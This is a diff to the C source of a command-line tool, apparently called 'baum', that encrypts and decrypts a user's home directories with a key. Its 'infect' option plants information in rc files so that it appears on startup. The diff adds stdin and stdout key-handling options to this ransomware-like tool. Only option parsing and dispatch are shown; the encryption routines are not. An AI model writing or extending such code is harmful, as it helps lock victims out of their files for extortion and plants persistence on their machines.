@@ -31,12 +31,20 @@ void help(void) {
 	printf("Options:\n");
 	printf("-h or --help: Displays this information.\n");
 	printf("-V or --version: Displays the current version number.\n");
+	printf("\n");
 	printf("-v or --verbose: Verbose mode on.\n");
 	printf("-t or --test: Do not delete or alter files.\n");
 	printf("-f or --force: Overwrite files even if they exist.\n");
-	printf("-k or --key: Create random key and write it to a file.\n");
-	printf("-e or --encrypt keyfile: Encrypt user home using a key file.\n");
-	printf("-d or --decrypt keyfile: Decrypt user home using a key file.\n");
+	printf("\n");
+	printf("-k or --key file: Create random key and write it to a file.\n");
+	printf("-K or --key-stdout: Create random key and write it to stdout.\n");
+	printf("\tKey length is 32 bytes.\n");
+	printf("\n");
+	printf("-e or --encrypt file: Encrypt user home using a key file.\n");
+	printf("-E or --encrypt-stdin: Encrypt user home using a key from stdin.\n");
+	printf("-d or --decrypt file: Decrypt user home using a key file.\n");
+	printf("-D or --decrypt-stdin: Decrypt user home using a key from stdin.\n");
+	printf("\n");
 	printf("-p or --print: Display information (default).\n");
 	printf("-i or --infect: Make -p information appear on startup.\n");
 	printf("-u or --uninfect: Remove infect information.\n");
@@ -55,8 +63,11 @@ int main(int argc, char **argv) {
 	char opt_help = 0;
 	char opt_version = 0;
 	char opt_key = 0;
+	char opt_key_stdout = 0;
 	char opt_encrypt = 0;
+	char opt_encrypt_stdin = 0;
 	char opt_decrypt = 0;
+	char opt_decrypt_stdin = 0;
 	char opt_print = 0;
 	char opt_infect = 0;
 	char opt_uninfect = 0;
@@ -66,20 +77,23 @@ int main(int argc, char **argv) {
 	char *opt_decrypt_file = NULL;
 
 	int next_option;
-	const char* const short_options = "hVvtfk:e:d:piu";
+	const char* const short_options = "hVvtfk:Ke:Ed:Dpiu";
 	const struct option long_options[] =
 	{
-		{ "help",	0, NULL, 'h' },
-		{ "version",	0, NULL, 'V' },
-		{ "verbose",	0, NULL, 'v' },
-		{ "test",	0, NULL, 't' },
-		{ "force",	0, NULL, 'f' },
-		{ "key",	1, NULL, 'k' },
-		{ "encrypt",	1, NULL, 'e' },
-		{ "decrypt",	1, NULL, 'd' },
-		{ "print",	0, NULL, 'p' },
-		{ "infect",	0, NULL, 'i' },
-		{ "uninfect",	0, NULL, 'u' },
+		{ "help",		0, NULL, 'h' },
+		{ "version",		0, NULL, 'V' },
+		{ "verbose",		0, NULL, 'v' },
+		{ "test",		0, NULL, 't' },
+		{ "force",		0, NULL, 'f' },
+		{ "key",		1, NULL, 'k' },
+		{ "key-stdout",		0, NULL, 'K' },
+		{ "encrypt",		1, NULL, 'e' },
+		{ "encrypt-stdin",	0, NULL, 'E' },
+		{ "decrypt",		1, NULL, 'd' },
+		{ "decrypt-stdin",	0, NULL, 'D' },
+		{ "print",		0, NULL, 'p' },
+		{ "infect",		0, NULL, 'i' },
+		{ "uninfect",		0, NULL, 'u' },
 		{ NULL, 0, NULL, 0 }
 	};
 
@@ -110,13 +124,22 @@ int main(int argc, char **argv) {
 			opt_key = 1;
 			opt_key_file = optarg;
 			break;
+		case 'K':
+			opt_key_stdout = 1;
+			break;
 		case 'e':
 			opt_encrypt = 1;
 			opt_encrypt_file = optarg;
 			break;
+		case 'E':
+			opt_encrypt_stdin = 1;
+			break;
 		case 'd':
 			opt_decrypt = 1;
 			opt_decrypt_file = optarg;
+			break;
+		case 'D':
+			opt_decrypt_stdin = 1;
 			break;
 		case 'p':
 			opt_print = 1;
@@ -143,7 +166,8 @@ int main(int argc, char **argv) {
 		return 0;
 	}
 
-	int selected = (opt_encrypt + opt_decrypt + opt_key
+	int selected = (opt_key + opt_encrypt + opt_decrypt
+		+ opt_key_stdout + opt_encrypt_stdin + opt_decrypt_stdin
 		+ opt_print + opt_infect + opt_uninfect);
 
 	if (selected > 1) {
@@ -158,13 +182,24 @@ int main(int argc, char **argv) {
 	if (opt_key) {
 		return baum_createkey(opt_key_file);
 	}
+	if (opt_key_stdout) {
+		return baum_createkey_stdout();
+	}
 	if (opt_encrypt) {
 		return baum_encrypt(DIRECTORIES,
 			EXTENSION, opt_encrypt_file);
 	}
+	if (opt_encrypt_stdin) {
+		return baum_encrypt_stdin(
+			DIRECTORIES, EXTENSION);
+	}
 	if (opt_decrypt) {
 		return baum_decrypt(DIRECTORIES,
 			EXTENSION, opt_decrypt_file);
+	}
+	if (opt_decrypt_stdin) {
+		return baum_decrypt_stdin(
+			DIRECTORIES, EXTENSION);
 	}
 	if (opt_infect) {
 		return baum_infect(rc_files);
